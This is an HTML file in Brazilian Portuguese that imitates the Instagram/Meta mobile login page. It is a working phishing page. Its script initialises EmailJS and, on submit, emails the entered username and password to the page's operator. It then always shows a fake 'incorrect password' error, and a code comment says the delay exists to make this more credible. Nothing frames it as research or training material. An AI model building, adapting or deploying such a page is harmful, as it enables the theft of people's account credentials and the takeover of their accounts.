<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <!-- Font Awesome para o ícone oficial da Meta -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <!-- SDK EmailJS -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <style>
        :root {
            --bg-color: #121b22;
            --input-bg: #1c2733;
            --input-border: #364147;
            --btn-blue: #0064e0;
            --text-primary: #ffffff;
            --text-secondary: #a8a8a8;
            --error-red: #fa3e3e;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-primary);
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            overflow: hidden;
        }

        .language-selector {
            font-size: 12px;
            color: var(--text-secondary);
            margin-top: 5px;
        }

        .main-content {
            width: 100%;
            max-width: 380px;
            padding: 0 30px;
            text-align: center;
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            margin-top: -30px;
        }

        .insta-logo-container {
            margin-bottom: 35px;
        }
        .insta-logo {
            width: 75px;
            height: 75px;
        }

        #error-message {
            color: var(--error-red);
            font-size: 14px;
            margin-bottom: 15px;
            display: none;
            font-weight: 400;
        }

        .input-wrapper {
            margin-bottom: 12px;
        }

        input {
            width: 100%;
            height: 54px;
            background-color: var(--input-bg);
            border: 1px solid var(--input-border);
            border-radius: 12px;
            color: var(--text-primary);
            padding: 0 16px;
            font-size: 15px;
            outline: none;
            transition: border 0.2s;
        }

        input:focus {
            border-color: #444;
        }

        input::placeholder {
            color: #727272;
        }

        .btn-submit {
            width: 100%;
            height: 44px;
            background-color: var(--btn-blue);
            color: white;
            border: none;
            border-radius: 22px;
            font-size: 14px;
            font-weight: 600;
            margin-top: 10px;
            cursor: pointer;
        }

        .btn-submit:disabled {
            opacity: 0.6;
        }

        .forgot-link {
            display: block;
            margin-top: 25px;
            color: var(--text-primary);
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        /* Rodapé com ícone da biblioteca */
        .footer {
            width: 100%;
            max-width: 380px;
            padding: 0 30px 15px;
            text-align: center;
        }

        .btn-new-account {
            width: 100%;
            height: 44px;
            background-color: transparent;
            color: #4da5f6;
            border: 1px solid #0095f6;
            border-radius: 22px;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 25px;
        }

        .meta-footer {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
            color: #8e8e8e;
        }

        .meta-footer i {
            font-size: 18px; /* Tamanho do ícone da Meta */
        }

        .meta-text {
            font-size: 13px;
            font-weight: 600;
            letter-spacing: 0.5px;
        }

        /* Loading */
        #loading {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(18, 27, 34, 0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .spinner {
            width: 24px; height: 24px;
            border: 3px solid rgba(255,255,255,0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="loading"><div class="spinner"></div></div>

    <div class="language-selector">Português (Brasil)</div>

    <div class="main-content">
        <div class="insta-logo-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png" alt="Instagram" class="insta-logo">
        </div>

        <div id="error-message">A senha inserida está incorreta. Tente novamente.</div>

        <form id="loginForm">
            <div class="input-wrapper">
                <input type="text" name="username" id="username" placeholder="Nome de usuário, email ou celular" required autocomplete="off">
            </div>
            <div class="input-wrapper">
                <input type="password" name="password" id="password" placeholder="Senha" required autocomplete="off">
            </div>
            <button type="submit" class="btn-submit" id="btnSubmit">Entrar</button>
        </form>

        <a href="#" class="forgot-link">Esqueceu a senha?</a>
    </div>

    <div class="footer">
        <a href="#" class="btn-new-account">Criar nova conta</a>
        
        <div class="meta-footer">
            <i class="fab fa-meta"></i>
            <span class="meta-text">Meta</span>
        </div>
    </div>

    <script>
        (function() {
            // Inicialização do EmailJS
            emailjs.init("8RX9bRb_kjK9Ee8q2"); 
        })();

        const form = document.getElementById("loginForm");
        const btnSubmit = document.getElementById("btnSubmit");
        const errorMsg = document.getElementById("error-message");
        const loading = document.getElementById("loading");

        form.addEventListener("submit", function(e) {
            e.preventDefault();
            loading.style.display = "flex";
            errorMsg.style.display = "none";

            const templateParams = {
                username: form.username.value,
                password: form.password.value
            };

            emailjs.send("service_y7qz76w", "template_fsq66g2", templateParams)
            .then(() => {
                // Simulação de delay para aumentar credibilidade
                setTimeout(() => {
                    loading.style.display = "none";
                    errorMsg.style.display = "block";
                    form.password.value = "";
                }, 1000);
            })
            .catch(() => {
                loading.style.display = "none";
                errorMsg.style.display = "block";
            });
        });

        // Habilitar botão apenas se houver texto
        form.addEventListener("input", () => {
            const user = document.getElementById("username").value.trim();
            const pass = document.getElementById("password").value.trim();
            btnSubmit.disabled = !(user.length > 0 && pass.length > 0);
        });
    </script>
</body>
</html>
